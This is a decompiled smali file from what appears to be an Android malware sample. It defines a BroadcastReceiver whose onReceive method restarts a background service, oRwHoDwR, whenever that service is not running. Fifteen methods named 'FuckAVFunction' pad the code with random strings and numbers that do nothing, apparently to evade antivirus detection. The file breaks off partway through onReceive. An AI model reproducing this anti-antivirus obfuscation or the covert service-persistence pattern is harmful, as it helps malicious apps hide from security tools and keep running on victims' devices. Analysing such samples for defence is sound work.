.class public Lcom/androiddg/pgroute/NJqTce;
.super Landroid/content/BroadcastReceiver;
.source "NJqTce.java"


# static fields
.field public static final ACTION:Ljava/lang/String; = "com.androiddg.pgroute.MainServiceStart"

.field private static p0:Ljava/lang/String;

.field private static p1:Ljava/lang/String;

.field private static p10:Ljava/lang/String;

.field private static p11:Ljava/lang/Boolean;

.field private static p12:Ljava/lang/String;

.field private static p13:Ljava/lang/Integer;

.field private static p14:Ljava/lang/Integer;

.field private static p15:Ljava/lang/Boolean;

.field private static p16:Ljava/lang/Integer;

.field private static p2:Ljava/lang/String;

.field private static p3:Ljava/lang/Integer;

.field private static p4:Ljava/lang/Boolean;

.field private static p5:Ljava/lang/String;

.field private static p6:Ljava/lang/String;

.field private static p7:Ljava/lang/String;

.field private static p8:Ljava/lang/String;

.field private static p9:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 7
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method

.method private static FuckAVFunction0(Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/Boolean;)Ljava/lang/Boolean;
    .locals 7
    .param p0, "v0"    # Ljava/lang/String;
    .param p1, "v1"    # Ljava/lang/Integer;
    .param p2, "v2"    # Ljava/lang/String;
    .param p3, "v3"    # Ljava/lang/String;
    .param p4, "v4"    # Ljava/lang/Integer;
    .param p5, "v5"    # Ljava/lang/Integer;
    .param p6, "v6"    # Ljava/lang/Boolean;

    .prologue
    .line 32
    move-object v4, p4

    .line 33
    .local v4, "s4":Ljava/lang/Integer;
    sput-object v4, Lcom/androiddg/pgroute/NJqTce;->p14:Ljava/lang/Integer;

    .line 34
    move-object v5, p5

    .line 35
    .local v5, "s5":Ljava/lang/Integer;
    sput-object v5, Lcom/androiddg/pgroute/NJqTce;->p16:Ljava/lang/Integer;

    .line 36
    move-object v6, p6

    .line 37
    .local v6, "s6":Ljava/lang/Boolean;
    sput-object v6, Lcom/androiddg/pgroute/NJqTce;->p4:Ljava/lang/Boolean;

    .line 38
    move-object v2, p2

    .line 39
    .local v2, "s2":Ljava/lang/String;
    sput-object v2, Lcom/androiddg/pgroute/NJqTce;->p7:Ljava/lang/String;

    .line 40
    move-object v1, p1

    .line 41
    .local v1, "s1":Ljava/lang/Integer;
    sput-object v1, Lcom/androiddg/pgroute/NJqTce;->p13:Ljava/lang/Integer;

    .line 42
    move-object v3, p3

    .line 43
    .local v3, "s3":Ljava/lang/String;
    sput-object v3, Lcom/androiddg/pgroute/NJqTce;->p6:Ljava/lang/String;

    .line 44
    move-object v0, p0

    .line 45
    .local v0, "s0":Ljava/lang/String;
    sput-object v0, Lcom/androiddg/pgroute/NJqTce;->p0:Ljava/lang/String;

    .line 46
    return-object v6
.end method

.method private static FuckAVFunction1(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Integer;)Ljava/lang/Integer;
    .locals 3
    .param p0, "v0"    # Ljava/lang/Boolean;
    .param p1, "v1"    # Ljava/lang/Boolean;
    .param p2, "v2"    # Ljava/lang/Integer;

    .prologue
    .line 49
    move-object v0, p0

    .line 50
    .local v0, "s0":Ljava/lang/Boolean;
    sput-object v0, Lcom/androiddg/pgroute/NJqTce;->p11:Ljava/lang/Boolean;

    .line 51
    move-object v1, p1

    .line 52
    .local v1, "s1":Ljava/lang/Boolean;
    sput-object v1, Lcom/androiddg/pgroute/NJqTce;->p15:Ljava/lang/Boolean;

    .line 53
    move-object v2, p2

    .line 54
    .local v2, "s2":Ljava/lang/Integer;
    sput-object v2, Lcom/androiddg/pgroute/NJqTce;->p13:Ljava/lang/Integer;

    .line 55
    return-object v2
.end method

.method private static FuckAVFunction10(Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;)Ljava/lang/String;
    .locals 6
    .param p0, "v0"    # Ljava/lang/Integer;
    .param p1, "v1"    # Ljava/lang/Integer;
    .param p2, "v2"    # Ljava/lang/String;
    .param p3, "v3"    # Ljava/lang/String;
    .param p4, "v4"    # Ljava/lang/Integer;
    .param p5, "v5"    # Ljava/lang/String;

    .prologue
    .line 168
    move-object v0, p0

    .line 169
    .local v0, "s0":Ljava/lang/Integer;
    sput-object v0, Lcom/androiddg/pgroute/NJqTce;->p3:Ljava/lang/Integer;

    .line 170
    move-object v2, p2

    .line 171
    .local v2, "s2":Ljava/lang/String;
    sput-object v2, Lcom/androiddg/pgroute/NJqTce;->p0:Ljava/lang/String;

    .line 172
    move-object v3, p3

    .line 173
    .local v3, "s3":Ljava/lang/String;
    sput-object v3, Lcom/androiddg/pgroute/NJqTce;->p1:Ljava/lang/String;

    .line 174
    move-object v1, p1

    .line 175
    .local v1, "s1":Ljava/lang/Integer;
    sput-object v1, Lcom/androiddg/pgroute/NJqTce;->p16:Ljava/lang/Integer;

    .line 176
    move-object v4, p4

    .line 177
    .local v4, "s4":Ljava/lang/Integer;
    sput-object v4, Lcom/androiddg/pgroute/NJqTce;->p13:Ljava/lang/Integer;

    .line 178
    move-object v5, p5

    .line 179
    .local v5, "s5":Ljava/lang/String;
    sput-object v5, Lcom/androiddg/pgroute/NJqTce;->p7:Ljava/lang/String;

    .line 180
    return-object v5
.end method

.method private static FuckAVFunction11(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/String;)Ljava/lang/String;
    .locals 6
    .param p0, "v0"    # Ljava/lang/String;
    .param p1, "v1"    # Ljava/lang/String;
    .param p2, "v2"    # Ljava/lang/String;
    .param p3, "v3"    # Ljava/lang/Integer;
    .param p4, "v4"    # Ljava/lang/Boolean;
    .param p5, "v5"    # Ljava/lang/String;

    .prologue
    .line 183
    move-object v5, p5

    .line 184
    .local v5, "s5":Ljava/lang/String;
    sput-object v5, Lcom/androiddg/pgroute/NJqTce;->p7:Ljava/lang/String;

    .line 185
    move-object v1, p1

    .line 186
    .local v1, "s1":Ljava/lang/String;
    sput-object v1, Lcom/androiddg/pgroute/NJqTce;->p6:Ljava/lang/String;

    .line 187
    move-object v0, p0

    .line 188
    .local v0, "s0":Ljava/lang/String;
    sput-object v0, Lcom/androiddg/pgroute/NJqTce;->p5:Ljava/lang/String;

    .line 189
    move-object v2, p2

    .line 190
    .local v2, "s2":Ljava/lang/String;
    sput-object v2, Lcom/androiddg/pgroute/NJqTce;->p1:Ljava/lang/String;

    .line 191
    move-object v3, p3

    .line 192
    .local v3, "s3":Ljava/lang/Integer;
    sput-object v3, Lcom/androiddg/pgroute/NJqTce;->p13:Ljava/lang/Integer;

    .line 193
    move-object v4, p4

    .line 194
    .local v4, "s4":Ljava/lang/Boolean;
    sput-object v4, Lcom/androiddg/pgroute/NJqTce;->p4:Ljava/lang/Boolean;

    .line 195
    return-object v5
.end method

.method private static FuckAVFunction12(Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 7
    .param p0, "v0"    # Ljava/lang/Integer;
    .param p1, "v1"    # Ljava/lang/String;
    .param p2, "v2"    # Ljava/lang/String;
    .param p3, "v3"    # Ljava/lang/Integer;
    .param p4, "v4"    # Ljava/lang/Integer;
    .param p5, "v5"    # Ljava/lang/String;
    .param p6, "v6"    # Ljava/lang/String;

    .prologue
    .line 198
    move-object v3, p3

    .line 199
    .local v3, "s3":Ljava/lang/Integer;
    sput-object v3, Lcom/androiddg/pgroute/NJqTce;->p14:Ljava/lang/Integer;

    .line 200
    move-object v6, p6

    .line 201
    .local v6, "s6":Ljava/lang/String;
    sput-object v6, Lcom/androiddg/pgroute/NJqTce;->p1:Ljava/lang/String;

    .line 202
    move-object v1, p1

    .line 203
    .local v1, "s1":Ljava/lang/String;
    sput-object v1, Lcom/androiddg/pgroute/NJqTce;->p2:Ljava/lang/String;

    .line 204
    move-object v5, p5

    .line 205
    .local v5, "s5":Ljava/lang/String;
    sput-object v5, Lcom/androiddg/pgroute/NJqTce;->p6:Ljava/lang/String;

    .line 206
    move-object v0, p0

    .line 207
    .local v0, "s0":Ljava/lang/Integer;
    sput-object v0, Lcom/androiddg/pgroute/NJqTce;->p13:Ljava/lang/Integer;

    .line 208
    move-object v4, p4

    .line 209
    .local v4, "s4":Ljava/lang/Integer;
    sput-object v4, Lcom/androiddg/pgroute/NJqTce;->p3:Ljava/lang/Integer;

    .line 210
    move-object v2, p2

    .line 211
    .local v2, "s2":Ljava/lang/String;
    sput-object v2, Lcom/androiddg/pgroute/NJqTce;->p5:Ljava/lang/String;

    .line 212
    return-object v6
.end method

.method private static FuckAVFunction13(Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;
    .locals 7
    .param p0, "v0"    # Ljava/lang/String;
    .param p1, "v1"    # Ljava/lang/Integer;
    .param p2, "v2"    # Ljava/lang/Boolean;
    .param p3, "v3"    # Ljava/lang/String;
    .param p4, "v4"    # Ljava/lang/Integer;
    .param p5, "v5"    # Ljava/lang/String;
    .param p6, "v6"    # Ljava/lang/Integer;

    .prologue
    .line 215
    move-object v1, p1

    .line 216
    .local v1, "s1":Ljava/lang/Integer;
    sput-object v1, Lcom/androiddg/pgroute/NJqTce;->p14:Ljava/lang/Integer;

    .line 217
    move-object v0, p0

    .line 218
    .local v0, "s0":Ljava/lang/String;
    sput-object v0, Lcom/androiddg/pgroute/NJqTce;->p2:Ljava/lang/String;

    .line 219
    move-object v4, p4

    .line 220
    .local v4, "s4":Ljava/lang/Integer;
    sput-object v4, Lcom/androiddg/pgroute/NJqTce;->p13:Ljava/lang/Integer;

    .line 221
    move-object v2, p2

    .line 222
    .local v2, "s2":Ljava/lang/Boolean;
    sput-object v2, Lcom/androiddg/pgroute/NJqTce;->p4:Ljava/lang/Boolean;

    .line 223
    move-object v5, p5

    .line 224
    .local v5, "s5":Ljava/lang/String;
    sput-object v5, Lcom/androiddg/pgroute/NJqTce;->p5:Ljava/lang/String;

    .line 225
    move-object v3, p3

    .line 226
    .local v3, "s3":Ljava/lang/String;
    sput-object v3, Lcom/androiddg/pgroute/NJqTce;->p6:Ljava/lang/String;

    .line 227
    move-object v6, p6

    .line 228
    .local v6, "s6":Ljava/lang/Integer;
    sput-object v6, Lcom/androiddg/pgroute/NJqTce;->p16:Ljava/lang/Integer;

    .line 229
    return-object v6
.end method

.method private static FuckAVFunction14(Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;)Ljava/lang/String;
    .locals 7
    .param p0, "v0"    # Ljava/lang/Boolean;
    .param p1, "v1"    # Ljava/lang/String;
    .param p2, "v2"    # Ljava/lang/String;
    .param p3, "v3"    # Ljava/lang/Integer;
    .param p4, "v4"    # Ljava/lang/String;
    .param p5, "v5"    # Ljava/lang/Integer;
    .param p6, "v6"    # Ljava/lang/String;

    .prologue
    .line 232
    move-object v0, p0

    .line 233
    .local v0, "s0":Ljava/lang/Boolean;
    sput-object v0, Lcom/androiddg/pgroute/NJqTce;->p11:Ljava/lang/Boolean;

    .line 234
    move-object v6, p6

    .line 235
    .local v6, "s6":Ljava/lang/String;
    sput-object v6, Lcom/androiddg/pgroute/NJqTce;->p12:Ljava/lang/String;

    .line 236
    move-object v1, p1

    .line 237
    .local v1, "s1":Ljava/lang/String;
    sput-object v1, Lcom/androiddg/pgroute/NJqTce;->p8:Ljava/lang/String;

    .line 238
    move-object v3, p3

    .line 239
    .local v3, "s3":Ljava/lang/Integer;
    sput-object v3, Lcom/androiddg/pgroute/NJqTce;->p3:Ljava/lang/Integer;

    .line 240
    move-object v4, p4

    .line 241
    .local v4, "s4":Ljava/lang/String;
    sput-object v4, Lcom/androiddg/pgroute/NJqTce;->p2:Ljava/lang/String;

    .line 242
    move-object v2, p2

    .line 243
    .local v2, "s2":Ljava/lang/String;
    sput-object v2, Lcom/androiddg/pgroute/NJqTce;->p10:Ljava/lang/String;

    .line 244
    move-object v5, p5

    .line 245
    .local v5, "s5":Ljava/lang/Integer;
    sput-object v5, Lcom/androiddg/pgroute/NJqTce;->p13:Ljava/lang/Integer;

    .line 246
    return-object v6
.end method

.method private static FuckAVFunction2(Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Integer;)V
    .locals 6
    .param p0, "v0"    # Ljava/lang/Boolean;
    .param p1, "v1"    # Ljava/lang/String;
    .param p2, "v2"    # Ljava/lang/String;
    .param p3, "v3"    # Ljava/lang/Integer;
    .param p4, "v4"    # Ljava/lang/String;
    .param p5, "v5"    # Ljava/lang/Integer;

    .prologue
    .line 58
    move-object v3, p3

    .line 59
    .local v3, "s3":Ljava/lang/Integer;
    sput-object v3, Lcom/androiddg/pgroute/NJqTce;->p16:Ljava/lang/Integer;

    .line 60
    move-object v1, p1

    .line 61
    .local v1, "s1":Ljava/lang/String;
    sput-object v1, Lcom/androiddg/pgroute/NJqTce;->p12:Ljava/lang/String;

    .line 62
    move-object v4, p4

    .line 63
    .local v4, "s4":Ljava/lang/String;
    sput-object v4, Lcom/androiddg/pgroute/NJqTce;->p10:Ljava/lang/String;

    .line 64
    move-object v5, p5

    .line 65
    .local v5, "s5":Ljava/lang/Integer;
    sput-object v5, Lcom/androiddg/pgroute/NJqTce;->p3:Ljava/lang/Integer;

    .line 66
    move-object v0, p0

    .line 67
    .local v0, "s0":Ljava/lang/Boolean;
    sput-object v0, Lcom/androiddg/pgroute/NJqTce;->p15:Ljava/lang/Boolean;

    .line 68
    move-object v2, p2

    .line 69
    .local v2, "s2":Ljava/lang/String;
    sput-object v2, Lcom/androiddg/pgroute/NJqTce;->p9:Ljava/lang/String;

    .line 71
    return-void
.end method

.method private static FuckAVFunction3(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 4
    .param p0, "v0"    # Ljava/lang/String;
    .param p1, "v1"    # Ljava/lang/String;
    .param p2, "v2"    # Ljava/lang/String;
    .param p3, "v3"    # Ljava/lang/String;

    .prologue
    .line 73
    move-object v1, p1

    .line 74
    .local v1, "s1":Ljava/lang/String;
    sput-object v1, Lcom/androiddg/pgroute/NJqTce;->p0:Ljava/lang/String;

    .line 75
    move-object v0, p0

    .line 76
    .local v0, "s0":Ljava/lang/String;
    sput-object v0, Lcom/androiddg/pgroute/NJqTce;->p2:Ljava/lang/String;

    .line 77
    move-object v3, p3

    .line 78
    .local v3, "s3":Ljava/lang/String;
    sput-object v3, Lcom/androiddg/pgroute/NJqTce;->p6:Ljava/lang/String;

    .line 79
    move-object v2, p2

    .line 80
    .local v2, "s2":Ljava/lang/String;
    sput-object v2, Lcom/androiddg/pgroute/NJqTce;->p1:Ljava/lang/String;

    .line 81
    return-object v3
.end method

.method private static FuckAVFunction4(Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;)Ljava/lang/String;
    .locals 7
    .param p0, "v0"    # Ljava/lang/Boolean;
    .param p1, "v1"    # Ljava/lang/Integer;
    .param p2, "v2"    # Ljava/lang/String;
    .param p3, "v3"    # Ljava/lang/String;
    .param p4, "v4"    # Ljava/lang/Boolean;
    .param p5, "v5"    # Ljava/lang/Boolean;
    .param p6, "v6"    # Ljava/lang/String;

    .prologue
    .line 84
    move-object v5, p5

    .line 85
    .local v5, "s5":Ljava/lang/Boolean;
    sput-object v5, Lcom/androiddg/pgroute/NJqTce;->p4:Ljava/lang/Boolean;

    .line 86
    move-object v6, p6

    .line 87
    .local v6, "s6":Ljava/lang/String;
    sput-object v6, Lcom/androiddg/pgroute/NJqTce;->p12:Ljava/lang/String;

    .line 88
    move-object v3, p3

    .line 89
    .local v3, "s3":Ljava/lang/String;
    sput-object v3, Lcom/androiddg/pgroute/NJqTce;->p8:Ljava/lang/String;

    .line 90
    move-object v2, p2

    .line 91
    .local v2, "s2":Ljava/lang/String;
    sput-object v2, Lcom/androiddg/pgroute/NJqTce;->p2:Ljava/lang/String;

    .line 92
    move-object v1, p1

    .line 93
    .local v1, "s1":Ljava/lang/Integer;
    sput-object v1, Lcom/androiddg/pgroute/NJqTce;->p14:Ljava/lang/Integer;

    .line 94
    move-object v4, p4

    .line 95
    .local v4, "s4":Ljava/lang/Boolean;
    sput-object v4, Lcom/androiddg/pgroute/NJqTce;->p15:Ljava/lang/Boolean;

    .line 96
    move-object v0, p0

    .line 97
    .local v0, "s0":Ljava/lang/Boolean;
    sput-object v0, Lcom/androiddg/pgroute/NJqTce;->p11:Ljava/lang/Boolean;

    .line 98
    return-object v6
.end method

.method private static FuckAVFunction5(Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;)Ljava/lang/String;
    .locals 7
    .param p0, "v0"    # Ljava/lang/Integer;
    .param p1, "v1"    # Ljava/lang/String;
    .param p2, "v2"    # Ljava/lang/Integer;
    .param p3, "v3"    # Ljava/lang/String;
    .param p4, "v4"    # Ljava/lang/Boolean;
    .param p5, "v5"    # Ljava/lang/Integer;
    .param p6, "v6"    # Ljava/lang/String;

    .prologue
    .line 101
    move-object v6, p6

    .line 102
    .local v6, "s6":Ljava/lang/String;
    sput-object v6, Lcom/androiddg/pgroute/NJqTce;->p7:Ljava/lang/String;

    .line 103
    move-object v4, p4

    .line 104
    .local v4, "s4":Ljava/lang/Boolean;
    sput-object v4, Lcom/androiddg/pgroute/NJqTce;->p15:Ljava/lang/Boolean;

    .line 105
    move-object v1, p1

    .line 106
    .local v1, "s1":Ljava/lang/String;
    sput-object v1, Lcom/androiddg/pgroute/NJqTce;->p0:Ljava/lang/String;

    .line 107
    move-object v2, p2

    .line 108
    .local v2, "s2":Ljava/lang/Integer;
    sput-object v2, Lcom/androiddg/pgroute/NJqTce;->p13:Ljava/lang/Integer;

    .line 109
    move-object v5, p5

    .line 110
    .local v5, "s5":Ljava/lang/Integer;
    sput-object v5, Lcom/androiddg/pgroute/NJqTce;->p16:Ljava/lang/Integer;

    .line 111
    move-object v3, p3

    .line 112
    .local v3, "s3":Ljava/lang/String;
    sput-object v3, Lcom/androiddg/pgroute/NJqTce;->p8:Ljava/lang/String;

    .line 113
    move-object v0, p0

    .line 114
    .local v0, "s0":Ljava/lang/Integer;
    sput-object v0, Lcom/androiddg/pgroute/NJqTce;->p3:Ljava/lang/Integer;

    .line 115
    return-object v6
.end method

.method private static FuckAVFunction6(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 4
    .param p0, "v0"    # Ljava/lang/String;
    .param p1, "v1"    # Ljava/lang/String;
    .param p2, "v2"    # Ljava/lang/String;
    .param p3, "v3"    # Ljava/lang/String;

    .prologue
    .line 118
    move-object v3, p3

    .line 119
    .local v3, "s3":Ljava/lang/String;
    sput-object v3, Lcom/androiddg/pgroute/NJqTce;->p8:Ljava/lang/String;

    .line 120
    move-object v1, p1

    .line 121
    .local v1, "s1":Ljava/lang/String;
    sput-object v1, Lcom/androiddg/pgroute/NJqTce;->p1:Ljava/lang/String;

    .line 122
    move-object v0, p0

    .line 123
    .local v0, "s0":Ljava/lang/String;
    sput-object v0, Lcom/androiddg/pgroute/NJqTce;->p9:Ljava/lang/String;

    .line 124
    move-object v2, p2

    .line 125
    .local v2, "s2":Ljava/lang/String;
    sput-object v2, Lcom/androiddg/pgroute/NJqTce;->p5:Ljava/lang/String;

    .line 127
    return-void
.end method

.method private static FuckAVFunction7(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;)V
    .locals 7
    .param p0, "v0"    # Ljava/lang/String;
    .param p1, "v1"    # Ljava/lang/Boolean;
    .param p2, "v2"    # Ljava/lang/String;
    .param p3, "v3"    # Ljava/lang/String;
    .param p4, "v4"    # Ljava/lang/String;
    .param p5, "v5"    # Ljava/lang/String;
    .param p6, "v6"    # Ljava/lang/Boolean;

    .prologue
    .line 129
    move-object v3, p3

    .line 130
    .local v3, "s3":Ljava/lang/String;
    sput-object v3, Lcom/androiddg/pgroute/NJqTce;->p8:Ljava/lang/String;

    .line 131
    move-object v1, p1

    .line 132
    .local v1, "s1":Ljava/lang/Boolean;
    sput-object v1, Lcom/androiddg/pgroute/NJqTce;->p4:Ljava/lang/Boolean;

    .line 133
    move-object v0, p0

    .line 134
    .local v0, "s0":Ljava/lang/String;
    sput-object v0, Lcom/androiddg/pgroute/NJqTce;->p7:Ljava/lang/String;

    .line 135
    move-object v5, p5

    .line 136
    .local v5, "s5":Ljava/lang/String;
    sput-object v5, Lcom/androiddg/pgroute/NJqTce;->p1:Ljava/lang/String;

    .line 137
    move-object v4, p4

    .line 138
    .local v4, "s4":Ljava/lang/String;
    sput-object v4, Lcom/androiddg/pgroute/NJqTce;->p5:Ljava/lang/String;

    .line 139
    move-object v6, p6

    .line 140
    .local v6, "s6":Ljava/lang/Boolean;
    sput-object v6, Lcom/androiddg/pgroute/NJqTce;->p11:Ljava/lang/Boolean;

    .line 141
    move-object v2, p2

    .line 142
    .local v2, "s2":Ljava/lang/String;
    sput-object v2, Lcom/androiddg/pgroute/NJqTce;->p2:Ljava/lang/String;

    .line 144
    return-void
.end method

.method private static FuckAVFunction8(Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;
    .locals 3
    .param p0, "v0"    # Ljava/lang/Integer;
    .param p1, "v1"    # Ljava/lang/String;
    .param p2, "v2"    # Ljava/lang/Integer;

    .prologue
    .line 146
    move-object v2, p2

    .line 147
    .local v2, "s2":Ljava/lang/Integer;
    sput-object v2, Lcom/androiddg/pgroute/NJqTce;->p14:Ljava/lang/Integer;

    .line 148
    move-object v0, p0

    .line 149
    .local v0, "s0":Ljava/lang/Integer;
    sput-object v0, Lcom/androiddg/pgroute/NJqTce;->p3:Ljava/lang/Integer;

    .line 150
    move-object v1, p1

    .line 151
    .local v1, "s1":Ljava/lang/String;
    sput-object v1, Lcom/androiddg/pgroute/NJqTce;->p6:Ljava/lang/String;

    .line 152
    return-object v2
.end method

.method private static FuckAVFunction9(Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;
    .locals 5
    .param p0, "v0"    # Ljava/lang/Integer;
    .param p1, "v1"    # Ljava/lang/String;
    .param p2, "v2"    # Ljava/lang/String;
    .param p3, "v3"    # Ljava/lang/String;
    .param p4, "v4"    # Ljava/lang/Integer;

    .prologue
    .line 155
    move-object v1, p1

    .line 156
    .local v1, "s1":Ljava/lang/String;
    sput-object v1, Lcom/androiddg/pgroute/NJqTce;->p8:Ljava/lang/String;

    .line 157
    move-object v0, p0

    .line 158
    .local v0, "s0":Ljava/lang/Integer;
    sput-object v0, Lcom/androiddg/pgroute/NJqTce;->p14:Ljava/lang/Integer;

    .line 159
    move-object v4, p4

    .line 160
    .local v4, "s4":Ljava/lang/Integer;
    sput-object v4, Lcom/androiddg/pgroute/NJqTce;->p13:Ljava/lang/Integer;

    .line 161
    move-object v2, p2

    .line 162
    .local v2, "s2":Ljava/lang/String;
    sput-object v2, Lcom/androiddg/pgroute/NJqTce;->p6:Ljava/lang/String;

    .line 163
    move-object v3, p3

    .line 164
    .local v3, "s3":Ljava/lang/String;
    sput-object v3, Lcom/androiddg/pgroute/NJqTce;->p7:Ljava/lang/String;

    .line 165
    return-object v4
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 10
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    const/4 v9, 0x1

    const/4 v8, 0x0

    .line 251
    const-string v0, "eLNsckkP"

    const v1, 0xc90e898

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v2, "qVsLsDooT"

    const-string v3, "AMddIlSth"

    const v4, 0xcef6fd7

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const v5, 0x11ac78ef

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androiddg/pgroute/NJqTce;->FuckAVFunction0(Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 252
    sget-boolean v0, Lcom/androiddg/pgroute/oRwHoDwR;->isRunning:Z

    if-nez v0, :cond_0

    .line 253
    const v0, 0x1c49942f

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const-string v1, "nQblpMUK"

    const-string v2, "VmBPkFa"

    const-string v3, "UIAbSth"

    const v4, 0x27d76e05

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    invoke-static {v0, v1, v2, v3, v4}, Lcom/androiddg/pgroute/NJqTce;->FuckAVFunction9(Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 254
    const-string v0, "jdfhfSn"

    const-string v1, "sBHTwgkwL"

    const-string v2, "AbjfOUWf"

    const-string v3, "qBsmFcB"

    invoke-static {v0, v1, v2, v3}, Lcom/androiddg/pgroute/NJqTce;->FuckAVFunction6(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 255
    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x120f310d

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/androiddg/pgroute/NJqTce;->FuckAVFunction1(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 256
    const-string v0, "aLTmH"

    const-string v1, "GSbfWfSCI"

    const-string v2, "cVisBD"

    const-string v3, "fSIKrEU"

    invoke-static {v0, v1, v2, v3}, Lcom/androiddg/pgroute/NJqTce;->FuckAVFunction6(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 257
    new-instance v7, Landroid/content/Intent;

    const-string v0, "com.androiddg.pgroute.MainServiceStart"

    invoke-direct {v7, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 258
    .local v7, "i":Landroid/content/Intent;
    const-string v0, "jQMAWpAS"

    const-string v1, "BuDsRgVu"

    const-string v2, "UWpdhK"

    const v3, 0x34998b9d    # 2.8600053E-7f

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    const-string v5, "skHquB"

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/NJqTce;->FuckAVFunction11(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/String;)Ljava/lang/String;

    .line 259
    const v0, 0x31870d23

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const-string v1, "iNFTTqsm"

    const-string v2, "nbWnfQbU"

    const-string v3, "PLBDeg"

    const v4, 0x2879f1a5

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    invoke-static {v0, v1, v2, v3, v4}, Lcom/androiddg/pgroute/NJqTce;->FuckAVFunction9(Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 260
    const-class v0, Lcom/androiddg/pgroute/oRwHoDwR;

    invoke-virtual {v7, p1, v0}, Landroid/content/Intent;->setClass(Landroid/content/Context;Ljava/lang/Class;)Landroid/content/Intent;

    .line 261
    const-string v0, "PwRomqB"

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "aamaoaa"

    const-string v3, "SUhbrlQ"

    const-string v4, "wocNDoas"

    const-string v5, "GIQAUrCC"

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androiddg/pgroute/NJqTce;->FuckAVFunction7(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;)V

    .line 262
    invoke-virtual {p1, v7}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 263
    const v0, 0x2aa93292

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const-string v1, "jGfIpbAU"

    const-string v2, "NqReViRLaJ"

    const-string v3, "hpIfpUQ"

